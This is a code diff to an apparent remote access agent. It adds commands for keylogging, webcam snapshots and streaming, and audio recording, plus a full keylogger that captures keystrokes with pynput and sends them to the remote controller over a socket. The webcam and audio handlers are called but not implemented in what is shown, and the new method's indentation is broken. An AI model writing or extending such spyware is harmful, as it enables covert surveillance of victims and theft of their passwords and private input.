@@ -87,6 +87,21 @@ class AgentClient:
         elif cmd == "quit":
             self.running = False
 
+        elif cmd.startswith("keylogger "):
+            duration = int(cmd.split()[1])
+            self._keylogger(duration)
+
+        elif cmd == "webcam_snapshot":
+            self._webcam_snapshot()
+
+        elif cmd.startswith("webcam_stream "):
+            duration = int(cmd.split()[1])
+            self._webcam_stream(duration)
+
+        elif cmd.startswith("record_audio "):
+            duration = int(cmd.split()[1])
+            self._record_audio(duration)
+
         else:
             pass
 
@@ -207,7 +222,34 @@ class AgentClient:
             FileUtils.send_file(self.sock, "screenshot.png")
         except Exception as e:
             logger.debug("[agent] Error in screenshot %s", e)
+    def _keylogger(self, duration: int):
+    """Enregistre les frappes clavier pendant `duration` secondes."""
+    import threading
+    try:
+        from pynput.keyboard import Listener
 
+        keys = []
+        stop_event = threading.Event()
+
+        def on_press(key):
+            try:
+                keys.append(key.char)
+            except AttributeError:
+                keys.append(f"[{key.name}]")
+
+        listener = Listener(on_press=on_press)
+        listener.start()
+        stop_event.wait(timeout=duration)
+        listener.stop()
+
+        output = "".join(keys).encode("utf-8")
+        self.sock.sendall(
+            b"DISPLAY\n" + str(len(output)).encode("utf-8") + b"\n" + output
+        )
+        logger.debug("[agent] Keylogger: %d keys captured", len(keys))
+    except Exception as e:
+        logger.debug("[agent] Keylogger error: %s", e)
+        
     def close(self):
         self.running = False
         if self.sock:
